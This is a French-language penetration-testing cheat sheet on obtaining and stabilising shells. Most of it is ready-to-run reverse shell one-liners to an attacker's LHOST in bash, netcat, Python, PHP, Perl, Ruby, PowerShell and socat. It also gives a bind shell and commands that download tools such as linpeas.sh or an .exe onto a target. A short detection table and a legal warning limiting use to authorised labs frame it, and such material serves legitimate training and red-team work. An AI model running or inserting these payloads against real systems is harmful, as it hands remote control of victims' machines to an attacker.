# Cheatsheet — Reverse & Bind Shells

Aide-mémoire pour obtenir et stabiliser un accès shell après exploitation.

> ⚠️ **Cadre strict.** Ces techniques ne s'emploient **que** sur tes labs et sur un périmètre autorisé par écrit. Hors convention d'audit, l'accès à un système distant est une infraction (art. 323-1 du Code pénal). En mission, tout est tracé et horodaté, et tout mécanisme posé est **retiré** en fin de test.

---

## 1. Le principe

| Type | Sens de la connexion | Quand l'utiliser |
| --- | --- | --- |
| **Reverse shell** | La **cible se connecte** à l'attaquant | Le cas normal : la cible sort vers Internet, mais un pare-feu bloque les connexions entrantes |
| **Bind shell** | L'attaquant **se connecte** à la cible qui écoute | Rare : utile si la cible ne peut pas sortir mais accepte de l'entrant |

Schéma reverse : la cible « rappelle » ton `LHOST:LPORT` où un **listener** attend.

Variables employées ci-dessous :
- `LHOST` = ton IP d'attaquant (Kali) — vérifie-la : `ip a`
- `LPORT` = ton port d'écoute (ex. `443`, `4444`)

---

## 2. Le listener (côté attaquant)

```bash
# netcat classique
nc -lvnp 443

# ncat (chiffré, propre) — recommandé
ncat -lvnp 443
ncat --ssl -lvnp 443          # TLS, pour ne pas exposer le shell en clair

# rlwrap : récupère l'historique et les flèches dans le shell obtenu
rlwrap nc -lvnp 443
```

`-l` écoute · `-v` verbeux · `-n` pas de DNS · `-p` port.

> Choisir un port « de confiance » (`443`, `53`) augmente les chances de sortir d'un réseau filtré.

---

## 3. Reverse shells (côté cible)

### Bash
```bash
bash -i >& /dev/tcp/LHOST/443 0>&1
```
```bash
# variante sans /dev/tcp
0<&196;exec 196<>/dev/tcp/LHOST/443; sh <&196 >&196 2>&196
```

### netcat
```bash
# si -e est disponible
nc -e /bin/bash LHOST 443

# sans -e (le plus portable) — via un FIFO
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

### PHP
```php
php -r '$s=fsockopen("LHOST",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```perl
perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Ruby
```ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("LHOST",443);loop{c.puts(`#{c.gets.chomp}`)rescue 0}'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

> Sur les systèmes récents, penser aussi à `mkfifo`, `socat` et aux binaires déjà présents (living off the land) plutôt qu'à un outil qu'il faut déposer.

### socat (shell pleinement interactif, chiffré)
```bash
# Attaquant
socat file:`tty`,raw,echo=0 tcp-listen:443

# Cible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:443
```

---

## 4. Bind shells

```bash
# Cible écoute
nc -lvnp 4444 -e /bin/bash

# Attaquant se connecte
nc CIBLE 4444
```

---

## 5. Stabiliser un shell (le réflexe indispensable)

Un shell brut n'a pas de TTY : pas de `sudo`, pas de flèches, il meurt sur un `Ctrl-C`. Upgrade :

```bash
# 1) obtenir un vrai pseudo-terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (ou : script -qc /bin/bash /dev/null)

# 2) mettre le shell en arrière-plan
Ctrl-Z

# 3) côté attaquant : passer le terminal en raw
stty raw -echo; fg
# (appuyer sur Entrée deux fois)

# 4) dans le shell rendu interactif
export TERM=xterm
stty rows 38 columns 116     # adapter à ton terminal (stty size)
```

À la fin : `reset` si l'affichage est cassé.

---

## 6. Transfert de fichiers (une fois dedans)

```bash
# Attaquant : servir un dossier
python3 -m http.server 80

# Cible : récupérer
wget http://LHOST/linpeas.sh -O /tmp/lp.sh     # Linux
curl http://LHOST/lp.sh -o /tmp/lp.sh
certutil -urlcache -f http://LHOST/x.exe x.exe  # Windows
```

---

## 7. Côté Blue Team — comment on te détecte

Ton profil Red **+** Blue : sache dire, pour chaque payload, la trace laissée.

| Technique | Trace / détection |
| --- | --- |
| Reverse shell | Processus (`bash`, `python`) avec socket réseau sortante inhabituelle ; connexion sortante vers un port/IP non attendu |
| `/dev/tcp` | Ligne de commande Bash suspecte dans les logs (auditd `execve`) |
| PowerShell encodé | Event **4104** (Script Block Logging), `-nop`/`-enc` en ligne de commande |
| netcat / socat déposé | Création de processus (Sysmon **1**), écriture de binaire inhabituel |
| Bind shell | Port en écoute non légitime (`netstat`/`ss`), Sysmon **3** |

**Détection générique** : un processus interpréteur (shell, python, powershell) qui **initie une connexion réseau** est un signal fort → règle Sigma, corrélation MITRE **T1059** (Command and Scripting Interpreter).

---

## 8. Dépannage rapide

| Symptôme | Cause probable | Piste |
| --- | --- | --- |
| Le listener ne reçoit rien | Pare-feu sortant côté cible | Essayer `443`/`53`, tester `-PU`/UDP |
| Shell qui meurt aussitôt | Pas de TTY / mauvais interpréteur | Stabiliser (section 5), tester `sh` au lieu de `bash` |
| `nc: invalid option -- 'e'` | netcat sans `-e` | Utiliser la variante FIFO (section 3) |
| Pas de python sur la cible | Binaire absent | `which python python2 python3 perl php`; sinon socat/FIFO |

---

## 9. Ressources de référence

- **revshells.com** — générateur de payloads (choisir IP/port/type).
- **PayloadsAllTheThings** — dépôt communautaire (rubrique *Reverse Shell Cheat Sheet*).
- **GTFOBins** — binaires détournables pour obtenir un shell.
- **HackTricks** — méthodo shells & stabilisation.
